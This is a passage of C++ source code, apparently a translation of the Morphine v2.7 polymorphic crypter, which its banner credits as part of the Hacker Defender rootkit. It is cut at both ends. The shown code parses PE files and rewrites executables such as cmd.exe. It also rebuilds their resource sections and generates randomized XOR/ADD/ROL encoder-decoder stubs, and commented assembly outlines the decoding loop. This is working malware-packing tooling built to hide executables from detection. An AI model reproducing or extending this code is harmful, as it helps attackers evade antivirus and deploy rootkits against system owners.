        FixInstr(PII_CODER_MOV_REG_KEY,AKeyPtr-LEIPSub);
        FixInstr(PII_CODER_CALL_GET_EIP,CallAddress(PII_CODER_CALL_GET_EIP,PII_CODER_GET_EIP)-InsFix2(PII_CODER_CALL_GET_EIP));
        FixInstr(PII_CODER_JZ_CODER_BEGIN,JcxAddress(PII_CODER_JZ_CODER_BEGIN,PII_CODER_KEY_START)-InsFix2(PII_CODER_JZ_CODER_BEGIN));
        FixInstr(PII_CODER_LOOP_CODER_CODE,JcxAddress(PII_CODER_LOOP_CODER_CODE,PII_CODER_CODE)-InsFix2(PII_CODER_LOOP_CODER_CODE));
        
        FixInstr(PII_POLY_JMP_DYNLOADER,ADynLoadAddr-(InsVAddr(PII_POLY_JMP_DYNLOADER)+5)-InsFix2(PII_POLY_JMP_DYNLOADER));
        
        
        //
        //this can tell you more about what it finally does
        //
        //
        
        //                                                        // PII_BEGIN
        // pusha
        
        //                                                        // PII_POLY_BEGIN
        // mov ecx,0WWXXYYZZh                //loader size        // PII_POLY_MOV_REG_LOADER_SIZE
        // mov edi,0WWXXYYZZh                //loader addr        // PII_POLY_MOV_REG_LOADER_ADDR
        
        //                                                        // PII_CODER_BEGIN
        // call PII_CODER_GET_EIP                                 // PII_CODER_CALL_GET_EIP
        // pop edx                                                // PII_CODER_GET_EIP
        // add edi,edx                                            // PII_CODER_FIX_DST_PTR
        //                                                        // PII_CODER_KEY_START
        // mov esi,0WWXXYYZZh                //key addr           // PII_CODER_MOV_REG_KEY
        // add esi,edx                                            // PII_CODER_FIX_SRC_PTR
        //                                                        // PII_CODER_CODE
        // mov eax,[esi]                     //load key bytes     // PII_CODER_LOAD_KEY_TO_REG
        // test eax,0FF000000h               //test end of key    // PII_CODER_TEST_KEY_END
        // jz PII_CODER_KEY_START            //restart key        // PII_CODER_JZ_CODER_BEGIN
        // add eax,ecx                       //add some stuff     // PII_CODER_ADD_DATA_IDX
        // xor [edi],eax                     //decode             // PII_CODER_XOR_DATA_REG
        // stosd                             //store data         // PII_CODER_STORE_DATA
        // inc esi                           //change key         // PII_CODER_INC_SRC_PTR
        // loop PII_CODER_CODE                                    // PII_CODER_LOOP_CODER_CODE
        //                                                        // PII_CODER_END

        // jmp @DynLoader_begin                                   // PII_POLY_JMP_DYNLOADER
        //                                                        // PII_POLY_END
        
        //                                                        // PII_END

}

void ExtractFileName(PCHAR Destination,PCHAR Source)
{
        PCHAR szTemp=strrchr(Source,'\\');      
        if(szTemp!=NULL)
        {
                szTemp++;
                DWORD l=DWORD(strlen(szTemp))+1;
                CopyMemory(Destination,szTemp,l);
        }
        Destination=NULL;
}


void About()
{
 printf("\n");
 printf("Morphine v2.7\n");
 printf("by Holy_Father && Ratter/29A\n");
 printf("as a part of Hacker Defender rootkit - www.hxdef.org\n");
 printf("Copyright (c) 2000,forever ExEwORx\n");
 printf("betatested by ch0pper <THEMASKDEMON@flashmail.com>\n");
 printf("birthday: 03.10.2004\n");
 printf("22.07.2005: translate into C++ by ashkBiz <ashkbiz@yahoo.com>\n");
 printf("\n");
}

void Usage(PCHAR FileName)
{
        PCHAR LStr;

        LStr=strrchr(FileName,'\\');
        if(LStr==NULL)
        {
                LStr=FileName;
        }
        else
        {
                LStr++;
        }
        About();

        printf("Usage: %s [-q] [-d] [-b:ImageBase] [-o:OutputFile] InputFile \n", LStr);
        printf("  -q             be quiet (no console output)\n");
        printf("  -d             for dynamic DLLs only\n");
        printf("  -i             save resource icon and XP manifest\n");
        printf("  -a             save overlay data from the end of original file\n");
        printf("  -b:ImageBase   specify image base in hexadecimal string\n");
        printf("                 (it is rounded up to next 00010000 multiple)\n");
        printf("  -o:OutputFile  specify file for output\n");
        printf("                 (InputFile will be rewritten if no OutputFile given)\n");
        printf("\n");
        printf("Examples:\n");
        printf("1) %s -q c:\\winnt\\system32\\cmd.exe\n", LStr);
        printf(" rewrite cmd.exe in system directory and write no info\n");
        printf("\n");
        printf("2) %s -b:1F000000 -o:newcmd.exe c:\\winnt\\system32\\cmd.exe\n", LStr);
        printf(" create new file called newcmd.exe based on cmd.exe in system dir\n");
        printf(" set its image base to 0x1F000000 and display info about processing\n");
        printf("\n");
        printf("3) %s -d static.dll\n", LStr);
        printf(" rewrite static.dll which is loaded only dynamically\n");
        printf("\n");
        printf("4) %s -i -o:cmdico.exe c:\\winnt\\system32\\cmd.exe\n", LStr);
        printf(" create new file called cmdico.exe based on cmd.exe in system dir\n");
        printf(" save its icon and or XP manifest in resource section\n");
        printf("\n");
        printf("5) %s -i -a srv.exe\n", LStr);
        printf(" rewrite srv.exe, save its icon, XP manifest and overlay data\n");
        printf("\n");
        exit(0);
}

void ErrorMsg(PCHAR AErrorMsg)
{
        if(!Quiet) printf("Error (%d): %s",GetLastError(),AErrorMsg);
}

//upcase for string
PCHAR UpperCase(PCHAR AStr)
{
        CharUpperBuff(AStr,(DWORD)strlen(AStr));
        return(AStr);
}

//converts a number to hex string
PCHAR IntToHex(PCHAR AStr,DWORD ACard,BYTE ADigits)
{
        strcpy(AStr,"0x");
        switch(ADigits)
        {
        case 2:
                _itoa((BYTE)ACard,AStr+2,16);
                break;

        case 4:
                _itoa((WORD)ACard,AStr+2,16);
                break;

        case 8:
                _itoa((DWORD)ACard,AStr+2,16);
                break;

        }
        CharUpperBuff(AStr+2,(DWORD)strlen(AStr));
        return(AStr);
}

//converts hex string to number
DWORD HexToInt(PCHAR AHex)
{
        int i;
        BYTE LO;
        DWORD LM;
        DWORD Result;
        LM=1;
        Result=0;
        AHex=UpperCase(AHex);
        if((strlen(AHex)>2) &&(AHex[0]=='0') &&(AHex[1]=='X')) 
        {
                AHex=AHex+2;
        }

        for(i=(int)strlen(AHex)-1;i>=0;i--)
        {
                if(!((AHex[i]=='0')||(AHex[i]=='1')||(AHex[i]=='2')||(AHex[i]=='3')||
             (AHex[i]=='4')||(AHex[i]=='5')||(AHex[i]=='6')||(AHex[i]=='7')||
                     (AHex[i]=='8')||(AHex[i]=='9')||(AHex[i]=='A')||(AHex[i]=='B')||
                     (AHex[i]=='C')||(AHex[i]=='D')||(AHex[i]=='E')||(AHex[i]=='F')))
                {
                        return(0);
                }
                if((AHex[i]=='0')||(AHex[i]=='1')||(AHex[i]=='2')||(AHex[i]=='3')||
           (AHex[i]=='4')||(AHex[i]=='5')||(AHex[i]=='6')||(AHex[i]=='7')||
                   (AHex[i]=='8')||(AHex[i]=='9'))
                {
                        LO=48;
                }
                else
                {
                        LO=55;
                }
                LO=AHex[i]-LO;
                Result=Result+LO*LM;
                LM=LM << 4;
        }
        return(Result);
}

//return TRUE if AData points on valid image file
BOOL CheckPEFile(PBYTE AData)
{
        pimage_dos_header=(PIMAGE_DOS_HEADER)AData;
        if(pimage_dos_header->e_magic!=IMAGE_DOS_SIGNATURE)
        {
                return 0;
        }
        pimage_nt_headers=(PIMAGE_NT_HEADERS)(AData+pimage_dos_header->e_lfanew);
        if(pimage_nt_headers->Signature!=IMAGE_NT_SIGNATURE)// PE00
        {
                return 0;
        }
        if(pimage_nt_headers->FileHeader.Machine!=IMAGE_FILE_MACHINE_I386)
        {
                return 0;
        }
        if(pimage_nt_headers->OptionalHeader.Magic!=IMAGE_NT_OPTIONAL_HDR_MAGIC)
        {
                return 0;
        }
        return 1;
}

//process command line, return true if args are ok
BOOL ProcessCmdLine(int argc, _TCHAR* argv[])
{
        int i;
        char LPar[255],LUpArg[255];
        char s_temp[16];
        //Result=FALSE;

        strcpy(Options,"");
        Quiet=FALSE;
        DynamicDLL=FALSE;
        SaveIcon=FALSE;
        SaveOverlay=FALSE;
        ReqImageBase=0;
        strcpy(InputFileName,"");
        strcpy(OutputFileName,"");

        if((argc<1)||(argc>6)) return 0;
        i=0;
        while(i<argc)
        {
                strcpy(LPar,argv[i]);
                strcpy(LUpArg,LPar);
                CharUpperBuff(LUpArg,(DWORD)strlen(LUpArg));
                if(LUpArg[0]=='-')
                {
                        if(strlen(LUpArg)==1)break;
                        switch(LUpArg[1])
                        {
                        case 'Q':
                                Quiet=TRUE;
                                break;

                        case 'D':
                                DynamicDLL=TRUE;
                                break;

                        case 'I':
                                SaveIcon=TRUE;
                                break;

                        case 'A':
                                SaveOverlay=TRUE;
                                break;

                        case 'B':
                        case 'O':
                                if(strlen(LUpArg)<4) goto l1;
                                if(LUpArg[2]!=':') goto l1;
                                if(LUpArg[1]=='B')
                                {
                                        memset(s_temp,0,sizeof(s_temp));
                                        s_temp[0]='0';
                                        s_temp[1]='x';
                                        memcpy(s_temp+2,LUpArg+strlen(LUpArg)-8,8);
                                        ReqImageBase=HexToInt(s_temp);
                                        if(ReqImageBase==0) goto l1;
                                }
                                else
                                {
                                        strcpy(s_temp,LPar+3);
                                        strcpy(OutputFileName,s_temp);
                                }
                                break;
                        
                        default: 
                                goto l1;
                                break;
                        }
                }
                else
                {
                        strcpy(InputFileName,LPar);
                }
                i++;
        }
l1:
        if(strlen(OutputFileName)==0) strcpy(OutputFileName,InputFileName);
        return((i!=1)&&(i==argc) &&(strlen(InputFileName)>0));
}

//allocate memory via VirtualAlloc
LPVOID MyAlloc(DWORD ASize)
{
        return(VirtualAlloc(NULL,ASize,MEM_COMMIT,PAGE_EXECUTE_READWRITE));
}

//free memory via VirtualAlloc
BOOL MyFree(LPVOID APtr)
{
        if(APtr!=NULL)return(VirtualFree(APtr,0,MEM_RELEASE));
        return(FALSE);
}

//extract and fill resource secion
void PrepareResourceSectionData()
{
        typedef struct _LTYPE_TABLE{
                IMAGE_RESOURCE_DIRECTORY                Directory;
                IMAGE_RESOURCE_DIRECTORY_ENTRY  IconsEntry,IconGroupEntry,XPEntry;
        }LTYPE_TABLE, *PLTYPE_TABLE;

        typedef struct _LXP_MANIFEST{
                RESOURCE_TABLE_DIRECTORY_ENTRY  NameDir;
                RESOURCE_TABLE_DIRECTORY_ENTRY  LangDir;
                IMAGE_RESOURCE_DATA_ENTRY               DataEntry;
        }LXP_MANIFEST, *PLXP_MANIFEST;

        typedef struct _LICON_GROUP{
                RESOURCE_TABLE_DIRECTORY_ENTRY  GroupNameDir;
                RESOURCE_TABLE_DIRECTORY_ENTRY  GroupLangDir;
                IMAGE_RESOURCE_DATA_ENTRY               GroupData;

                int IconCount;

                IMAGE_RESOURCE_DIRECTORY                        NameDir;
                IMAGE_RESOURCE_DIRECTORY_ENTRY  NameEntries[32];
                
                RESOURCE_TABLE_DIRECTORY_ENTRY  LangDirs[32];
                
                IMAGE_RESOURCE_DATA_ENTRY                       DataEntries[32];
        }LICON_GROUP, *PLICON_GROUP;

        LTYPE_TABLE LTypeTable;
        LXP_MANIFEST LXPManifest;
        LICON_GROUP LIconGroup;

        CHAR LResourceStrings[1024];
        CHAR LResourceData[65536];
        DWORD LResourceStringsPtr,LResourceDataPtr;

        PICON_DIRECTORY LIconDirectory;

        PIMAGE_RESOURCE_DIRECTORY_ENTRY LNameEntry;
        PRESOURCE_TABLE_DIRECTORY_ENTRY LLangEntry;
        PIMAGE_RESOURCE_DATA_ENTRY LDataEntry;
        DWORD LNameRVA,LSubEntryRVA,LSize,LResStringsRVA,LResDataRVA,LManifestSize,LResRawRVA;
        WORD LNameLen;
        PBYTE LPB;//,LPBManifest;
        int LI;
        HMODULE LImage;
        HRSRC LIcoRes;

        ZeroMemory(&LTypeTable,sizeof(LTYPE_TABLE));
        ZeroMemory(&LXPManifest,sizeof(LXP_MANIFEST));
        ZeroMemory(&LIconGroup,sizeof(LICON_GROUP));

        LImage=LoadLibraryEx(InputFileName,NULL,LOAD_LIBRARY_AS_DATAFILE);
        ResourceSectionSize=0;
        ZeroMemory(&LTypeTable,sizeof(LTypeTable));
        if(ResourceIconGroup!=NULL) LTypeTable.Directory.NumberOfIdEntries+=2;
        if(ResourceXPManifest!=NULL) LTypeTable.Directory.NumberOfIdEntries++;
        LTypeTable.IconsEntry.Name=(WORD)RT_ICON;
        LTypeTable.IconsEntry.OffsetToData=0x80000000;
        LTypeTable.IconGroupEntry.Name=(WORD)RT_GROUP_ICON;
        LTypeTable.IconGroupEntry.OffsetToData=0x80000000;
        LTypeTable.XPEntry.Name=RT_XP_MANIFEST;
        LTypeTable.XPEntry.OffsetToData=0x80000000;

        LResourceStringsPtr=0;
        LResourceDataPtr=0;

        if(ResourceIconGroup!=NULL)
        {
                ZeroMemory(&LIconGroup,sizeof(LIconGroup));
                LPB=(PBYTE)(ResourceIconGroup);
                LPB+=sizeof(IMAGE_RESOURCE_DIRECTORY);
                LNameEntry=(PIMAGE_RESOURCE_DIRECTORY_ENTRY)(LPB);

                LNameRVA=LNameEntry->NameOffset;// & 0x7FFFFFFF;
                LSubEntryRVA=LNameEntry->OffsetToDirectory;// & 0x7FFFFFFF;

                if(LNameEntry->NameIsString!=0)//.NameID and 0x80000000<>0 
                {
                        LIconGroup.GroupNameDir.Table.NumberOfNamedEntries=1;
                        LPB=(PBYTE)RVA2RAW(MainData,HostResourceSectionVirtualAddress+LNameRVA);
                        memcpy(&LNameLen,LPB,2);
                        LNameLen=2*LNameLen;
                        LIconGroup.GroupNameDir.Directory.Name=LResourceStringsPtr+0x80000000;
                        CopyMemory(&LResourceStrings[LResourceStringsPtr],LPB,LNameLen+2);
                        LResourceStringsPtr+=LNameLen+2;
                }
                else
                {
                        LIconGroup.GroupNameDir.Directory.Name=LNameEntry->Name;
                        LIconGroup.GroupNameDir.Table.NumberOfIdEntries=1;
                }
                LIconGroup.GroupNameDir.Directory.OffsetToData=0;
                
                LLangEntry=(PRESOURCE_TABLE_DIRECTORY_ENTRY)
                        RVA2RAW(MainData,HostResourceSectionVirtualAddress+LSubEntryRVA);
                LSubEntryRVA=LLangEntry->Directory.OffsetToDirectory;
                LIconGroup.GroupLangDir.Table.NumberOfIdEntries=1;
                LIconGroup.GroupLangDir.Directory.Name=LLangEntry->Directory.Name;
                LIconGroup.GroupLangDir.Directory.OffsetToData=0;

                LDataEntry=(PIMAGE_RESOURCE_DATA_ENTRY)
                        RVA2RAW(MainData,HostResourceSectionVirtualAddress+LSubEntryRVA);
                LPB=(PBYTE)RVA2RAW(MainData,LDataEntry->OffsetToData);
                LIconGroup.GroupData.Size=LDataEntry->Size;
                LIconGroup.GroupData.OffsetToData=LResourceDataPtr;
                LIconGroup.GroupData.CodePage=LDataEntry->CodePage;

                CopyMemory(&LResourceData[LResourceDataPtr],LPB,LDataEntry->Size);
                LResourceDataPtr+=LDataEntry->Size;

                LIconDirectory=(PICON_DIRECTORY)(LPB);
                LIconGroup.IconCount=LIconDirectory->Count;
                LIconGroup.NameDir.NumberOfIdEntries=LIconGroup.IconCount;
                for(LI=0;LI<LIconDirectory->Count;LI++)
                {
                        LIconGroup.NameEntries[LI].Name=LIconDirectory->Entries[LI].ID;
                        LIconGroup.NameEntries[LI].OffsetToData=0x80000000;
                        LIconGroup.LangDirs[LI].Table.NumberOfIdEntries=1;
                        LIconGroup.LangDirs[LI].Directory.OffsetToData=0x80000000;

                        LIcoRes=FindResource(LImage,MAKEINTRESOURCE(LIconDirectory->Entries[LI].ID),RT_ICON);
                        LPB=(PBYTE)LockResource(LoadResource(LImage,LIcoRes));
                        LSize=SizeofResource(LImage,LIcoRes);
                        LIconGroup.DataEntries[LI].Size=LSize;
                        LIconGroup.DataEntries[LI].OffsetToData=LResourceDataPtr;
                        
                        CopyMemory(&LResourceData[LResourceDataPtr],LPB,LSize);
                        LResourceDataPtr+=LSize;
                }

                LSize=6+LIconDirectory->Count*sizeof(ICON_DIRECTORY_ENTRY);
                CopyMemory(&LResourceData[LResourceDataPtr],LIconDirectory,LSize);
                LResourceDataPtr+=LSize;
        }

        if(ResourceXPManifest!=NULL)
        {
                LPB=(PBYTE)ResourceXPManifest;
                LPB+=sizeof(IMAGE_RESOURCE_DIRECTORY);
                LNameEntry=(PIMAGE_RESOURCE_DIRECTORY_ENTRY)LPB;
                LNameRVA=LNameEntry->NameOffset;
                LSubEntryRVA=LNameEntry->OffsetToDirectory;
                
                LXPManifest.NameDir.Table.NumberOfIdEntries=1;
                LXPManifest.NameDir.Directory.Name=LNameRVA;
                LXPManifest.NameDir.Directory.OffsetToData=0x80000000;
                
                LLangEntry=(PRESOURCE_TABLE_DIRECTORY_ENTRY)
                        RVA2RAW(MainData,HostResourceSectionVirtualAddress+LSubEntryRVA);
                LNameRVA=LLangEntry->Directory.NameOffset;
                LSubEntryRVA=LLangEntry->Directory.OffsetToDirectory;
                LXPManifest.LangDir.Table.NumberOfIdEntries=1;
                LXPManifest.LangDir.Directory.Name=LNameRVA;
                LXPManifest.LangDir.Directory.OffsetToData=0x80000000;
                
                LDataEntry=(PIMAGE_RESOURCE_DATA_ENTRY)
                        RVA2RAW(MainData,HostResourceSectionVirtualAddress+LSubEntryRVA);
                LPB=(PBYTE)RVA2RAW(MainData,LDataEntry->OffsetToData);
                LXPManifest.DataEntry.OffsetToData=LResourceDataPtr;
                LXPManifest.DataEntry.Size=LDataEntry->Size;
                LXPManifest.DataEntry.CodePage=LDataEntry->CodePage;
                
                CopyMemory(&LResourceData[LResourceDataPtr],LPB,LDataEntry->Size);
                LResourceDataPtr+=LDataEntry->Size;
        }

        LPB=(PBYTE)ResourceData;
        LManifestSize=0;
        if(ResourceXPManifest!=NULL) LManifestSize=2*sizeof(RESOURCE_TABLE_DIRECTORY_ENTRY);

        LSubEntryRVA=sizeof(LTypeTable.Directory) | 0x80000000;
        if(ResourceIconGroup!=NULL) LSubEntryRVA+=sizeof(LTypeTable.IconsEntry)+sizeof(LTypeTable.IconGroupEntry);
        if(ResourceXPManifest!=NULL) LSubEntryRVA+=sizeof(LTypeTable.XPEntry);
        if(ResourceIconGroup==NULL) LTypeTable.XPEntry.OffsetToData=LSubEntryRVA;
        else LTypeTable.IconsEntry.OffsetToData=LSubEntryRVA;
        LSize=LSubEntryRVA & 0x7FFFFFFF;
        LPB+=LSize;

        if(ResourceIconGroup==NULL)
        {
                LResDataRVA=LSubEntryRVA & 0x7FFFFFFF;
                LResDataRVA+=sizeof(LXPManifest.NameDir);
                LResDataRVA+=sizeof(LXPManifest.LangDir);
        }
        else
        {
                LResStringsRVA=LSubEntryRVA;
                LResStringsRVA+=sizeof(LIconGroup.NameDir);
                LResStringsRVA+=LIconGroup.IconCount*sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY);
                LResStringsRVA+=LIconGroup.IconCount*sizeof(RESOURCE_TABLE_DIRECTORY_ENTRY);
                LResStringsRVA+=sizeof(LIconGroup.GroupNameDir);
                LResStringsRVA+=sizeof(LIconGroup.GroupLangDir);
                LResStringsRVA+=LManifestSize;
                LResDataRVA=(LResStringsRVA & 0x7FFFFFFF)+LResourceStringsPtr;
                
                //icons - name directory
                LSize=sizeof(LIconGroup.NameDir);
                LSubEntryRVA+=LSize;
                CopyMemory(LPB,&LIconGroup.NameDir,LSize);
                LPB+=LSize;
                
                //icons - name entries
                LSize=LIconGroup.IconCount*sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY);
                LSubEntryRVA+=LSize;
                for(LI=0;LI<LIconGroup.IconCount;LI++)
                {
                        LIconGroup.NameEntries[LI].OffsetToData=LSubEntryRVA;
                        LSubEntryRVA+=sizeof(RESOURCE_TABLE_DIRECTORY_ENTRY);
                }
                CopyMemory(LPB,&LIconGroup.NameEntries,LSize);
                LPB+=LSize;

                //icons - lang directory + entries
                LSize=LIconGroup.IconCount*sizeof(RESOURCE_TABLE_DIRECTORY_ENTRY);
                for(LI=0;LI<LIconGroup.IconCount;LI++)
                {
                        LIconGroup.LangDirs[LI].Directory.OffsetToData=LResDataRVA;
                        LResDataRVA+=sizeof(IMAGE_RESOURCE_DATA_ENTRY);
                }
                CopyMemory(LPB,&LIconGroup.LangDirs,LSize);
                LPB+=LSize;

                //icon group - name directory
                LTypeTable.IconGroupEntry.OffsetToData=LSubEntryRVA;
                LSize=sizeof(LIconGroup.GroupNameDir.Table);
                LSubEntryRVA+=LSize;
                CopyMemory(LPB,&LIconGroup.GroupNameDir.Table,LSize);
                LPB+=LSize;
                
                //icon group - name entry
                if(LIconGroup.GroupNameDir.Directory.NameIsString!=0)
                {
                        LIconGroup.GroupNameDir.Directory.Name=LResStringsRVA | 0x80000000;
                }

                LSize=sizeof(LIconGroup.GroupNameDir.Directory);
                LSubEntryRVA+=LSize;
                LIconGroup.GroupNameDir.Directory.OffsetToData=LSubEntryRVA;
                CopyMemory(LPB,&LIconGroup.GroupNameDir.Directory,LSize);
                LPB+=LSize;
                
                //icon group - lang directory + entry
                LIconGroup.GroupLangDir.Directory.OffsetToData=LResDataRVA;
                LSize=sizeof(LIconGroup.GroupLangDir);
                LSubEntryRVA+=LSize;
                LResDataRVA+=sizeof(IMAGE_RESOURCE_DATA_ENTRY);
                CopyMemory(LPB,&LIconGroup.GroupLangDir,LSize);
                LPB+=LSize;
        }

        if(ResourceXPManifest!=NULL)
        {
                LTypeTable.XPEntry.OffsetToData=LSubEntryRVA;
                
                //manifest - name directory + entry
                LSize=sizeof(LXPManifest.NameDir);
                LSubEntryRVA+=LSize;
                LXPManifest.NameDir.Directory.OffsetToData=LSubEntryRVA;
                CopyMemory(LPB,&LXPManifest.NameDir,LSize);
                LPB+=LSize;
                
                //manifest - lang directory + entry
                LSize=sizeof(LXPManifest.LangDir);
                LXPManifest.LangDir.Directory.OffsetToData=LResDataRVA;
                LResDataRVA+=sizeof(IMAGE_RESOURCE_DATA_ENTRY);
                CopyMemory(LPB,&LXPManifest.LangDir,LSize);
                LPB+=LSize;
        }
        
        //strings
        CopyMemory(LPB,&LResourceStrings,LResourceStringsPtr);
        LPB+=LResourceStringsPtr;
        
        LResRawRVA=LResDataRVA & 0x7FFFFFFF;

        if(ResourceIconGroup!=NULL)
        {
                //icons - data
                LSize=sizeof(IMAGE_RESOURCE_DATA_ENTRY)*LIconGroup.IconCount;
                for(LI=0;LI<LIconGroup.IconCount;LI++)
                {
                        LIconGroup.DataEntries[LI].OffsetToData+=LResRawRVA+ResourceSection.VirtualAddress;
                }
                CopyMemory(LPB,&LIconGroup.DataEntries,LSize);
                LPB+=LSize;
                
                //icon group - data
                LSize=sizeof(LIconGroup.GroupData);
                LIconGroup.GroupData.OffsetToData+=LResRawRVA+ResourceSection.VirtualAddress;
                CopyMemory(LPB,&LIconGroup.GroupData,LSize);
                LPB+=LSize;
        }
        
        if(ResourceXPManifest!=NULL)
        {
                //manifest - data
                LSize=sizeof(LXPManifest.DataEntry);
                LXPManifest.DataEntry.OffsetToData+=LResRawRVA+ResourceSection.VirtualAddress;
                CopyMemory(LPB,&LXPManifest.DataEntry,LSize);
                LPB+=LSize;
        }
        
        CopyMemory(LPB,&LResourceData,LResourceDataPtr);
        LPB+=LResourceDataPtr;
        ResourceSectionSize=DWORD(LPB)-DWORD(ResourceData);
        
        LPB=(PBYTE)ResourceData;
        CopyMemory(LPB,&LTypeTable,sizeof(LTypeTable.Directory));
        LPB+=sizeof(LTypeTable.Directory);
        if(ResourceIconGroup!=NULL)
        {
                CopyMemory(LPB,&LTypeTable.IconsEntry,sizeof(LTypeTable.IconsEntry));
                LPB+=sizeof(LTypeTable.IconsEntry);
                CopyMemory(LPB,&LTypeTable.IconGroupEntry,sizeof(LTypeTable.IconGroupEntry));
                LPB+=sizeof(LTypeTable.IconGroupEntry);
        }
        if(ResourceXPManifest!=NULL)
         {
                CopyMemory(LPB,&LTypeTable.XPEntry,sizeof(LTypeTable.XPEntry));
        }

        FreeLibrary(LImage);
}

//----------------------------------------------------------------------------------
//function GenerateEncoderDecoder(AHostSize:Cardinal;out OEncoder,ODecoder:Pointer):Cardinal;
//generate encoder and decoder for the host file
//returns size of decoder
#define CI_XOR                  0
#define CI_ADD                  1
#define CI_SUB                  2
#define CI_ROR                  3
#define CI_ROL                  4
#define CI_NOT                  5
#define CI_NEG                  6
#define CI_BSWAP                7
#define CI_XOR_OFS              8
#define CI_ADD_OFS              9
#define CI_SUB_OFS              10
#define CI_XOR_SMH              11
#define CI_ADD_SMH              12
#define CI_SUB_SMH              13
#define CI_SMH_ADD              14
#define CI_SMH_SUB              15
#define CI_MAX                  16


typedef struct _CODER_INSTRUCTION
{
        BYTE IType,ILen;
        DWORD IArg1,IArg2,IArg3;
}CODER_INSTRUCTION;

typedef struct _CODER_CONTEXT
{
        BYTE DataSizeRegister;
        BYTE DataAddrRegister;
        BYTE DataRegister;
        BYTE OffsetRegister;
        BYTE SmashRegister;
        BYTE FreeRegister;
}CODER_CONTEXT;

typedef CODER_INSTRUCTION t_CODER[256];

CODER_CONTEXT LCoderContext;
t_CODER LEncoder,LDecoder;
CHAR LEncoderData[512],LDecoderData[512];
BYTE LInstrCount;
//BYTE LReg;
#ifdef STATIC_CONTEXT
int LNotUsed;
BOOL LRegUsed[Reg32Count];
#endif
//PBYTE LPB;
PBYTE LPB2;
DWORD LEncSize,LDecSize,LSmashNum;

void GenerateCoderInstruction(t_CODER ACoder,int AInstr)
{
        switch(ACoder[AInstr].IType)
        {
        case CI_XOR:
                XorReg32Num32(LPB,LCoderContext.DataRegister,ACoder[AInstr].IArg1);
                break;

        case CI_ADD:
                AddReg32Num32(LPB,LCoderContext.DataRegister,ACoder[AInstr].IArg1);
                break;

        case CI_SUB:
                SubReg32Num32(LPB,LCoderContext.DataRegister,ACoder[AInstr].IArg1);
                break;

        case CI_ROR:
                RorReg32Num8(LPB,LCoderContext.DataRegister,(BYTE)ACoder[AInstr].IArg1);
                break;

        case CI_ROL:
                RolReg32Num8(LPB,LCoderContext.DataRegister,(BYTE)ACoder[AInstr].IArg1);
                break;

        case CI_NOT:
                NotReg32(LPB,LCoderContext.DataRegister);
                break;

        case CI_NEG:
                NegReg32(LPB,LCoderContext.DataRegister);
                break;

        case CI_BSWAP:
                Bswap(LPB,LCoderContext.DataRegister);
                break;

        case CI_XOR_OFS:
                XorReg32Reg32(LPB,LCoderContext.DataRegister,LCoderContext.OffsetRegister);
                break;

        case CI_ADD_OFS:
                AddReg32Reg32(LPB,LCoderContext.DataRegister,LCoderContext.OffsetRegister);
                break;

        case CI_SUB_OFS:
                SubReg32Reg32(LPB,LCoderContext.DataRegister,LCoderContext.OffsetRegister);
                break;

        case CI_XOR_SMH:
                XorReg32Reg32(LPB,LCoderContext.DataRegister,LCoderContext.SmashRegister);
                break;

        case CI_ADD_SMH:
                AddReg32Reg32(LPB,LCoderContext.DataRegister,LCoderContext.SmashRegister);
                break;

        case CI_SUB_SMH:
                SubReg32Reg32(LPB,LCoderContext.DataRegister,LCoderContext.SmashRegister);
                break;

        case CI_SMH_ADD:
                AddReg32Num32(LPB,LCoderContext.SmashRegister,ACoder[AInstr].IArg1);
                break;

        case CI_SMH_SUB:
                SubReg32Num32(LPB,LCoderContext.SmashRegister,ACoder[AInstr].IArg1);
                break;
        }
}

//generate encoder and decoder for the host file
//returns size of decoder
DWORD GenerateEncoderDecoder(DWORD AHostSize,PCHAR &OEncoder,PCHAR &ODecoder)
{
        int i;
        LInstrCount=(BYTE)Random(32)+16;        //number of instructions in encoder/decoder

        LSmashNum=Random(0xFFFFFFFF);

        //at first generate coder context
        for(i=0;i<Reg32Count;i++) LRegUsed[i]=FALSE;
        LRegUsed[REG_ESP]=TRUE;
        LRegUsed[REG_EBP]=TRUE;
        LNotUsed=Reg32Count-2;
        while(LNotUsed>0)
        {
                LReg=(BYTE)Random(Reg32Count);
                while(LRegUsed[LReg]) 
                {
                        LReg=(LReg+1) % Reg32Count;
                }
                LRegUsed[LReg]=TRUE;

                switch(LNotUsed)
                {
                case 1:
                        LCoderContext.DataSizeRegister=LReg;
                        break;

                case 2:
                        LCoderContext.DataAddrRegister=LReg;
                        break;

                case 3:
                        LCoderContext.DataRegister=LReg;
                        break;

                case 4:
                        LCoderContext.OffsetRegister=LReg;
                        break;

                case 5:
                        LCoderContext.SmashRegister=LReg;
                        break;

                case 6:
                        LCoderContext.FreeRegister=LReg;
                        break;
                }
                LNotUsed--;
        }

        //generate encoder/decoder
        for(i=0;i<LInstrCount;i++)
        {
                LEncoder[i].IType=(BYTE)Random(CI_MAX);
                switch(LEncoder[i].IType)
                {
                case CI_XOR:
                        //DataRegister = DataRegister xor IArg1
                        LEncoder[i].IArg1=Random(0xFFFFFFFF);
                        LDecoder[i].IType=CI_XOR;
                        LDecoder[i].IArg1=LEncoder[i].IArg1;
                        break;

                case CI_ADD:
                        //DataRegister = DataRegister + IArg1
                        LEncoder[i].IArg1=Random(0xFFFFFFFF);
                        //DataRegister = DataRegister - IArg1
                        LDecoder[i].IType=CI_SUB;
                        LDecoder[i].IArg1=LEncoder[i].IArg1;
                        break;

                case CI_SUB:
                        //DataRegister = DataRegister - IArg1
                        LEncoder[i].IArg1=Random(0xFFFFFFFF);
                        //DataRegister = DataRegister + IArg1
                        LDecoder[i].IType=CI_ADD;
                        LDecoder[i].IArg1=LEncoder[i].IArg1;
                        break;

                case CI_ROR:
                        //DataRegister = DataRegister ror IArg1
                        LEncoder[i].IArg1=Random(0x100);
                        //DataRegister = DataRegister rol IArg1
                        LDecoder[i].IType=CI_ROL;
                        LDecoder[i].IArg1=LEncoder[i].IArg1;
                        break;

                case CI_ROL:
                        //DataRegister = DataRegister rol IArg1
                        LEncoder[i].IArg1=Random(0x100);
                        //DataRegister = DataRegister ror IArg1
                        LDecoder[i].IType=CI_ROR;
                        LDecoder[i].IArg1=LEncoder[i].IArg1;
                        break;

                case CI_NOT:
                        //DataRegister = not DataRegister
                        LDecoder[i].IType=CI_NOT;
                        break;

                case CI_NEG:
                        //DataRegister = -DataRegister
                        LDecoder[i].IType=CI_NEG;
                        break;

                case CI_BSWAP:
                        //DataRegister = swaped DataRegister
                        LDecoder[i].IType=CI_BSWAP;
                        break;

                case CI_XOR_OFS:
                        //DataRegister = DataRegister xor OffsetRegister
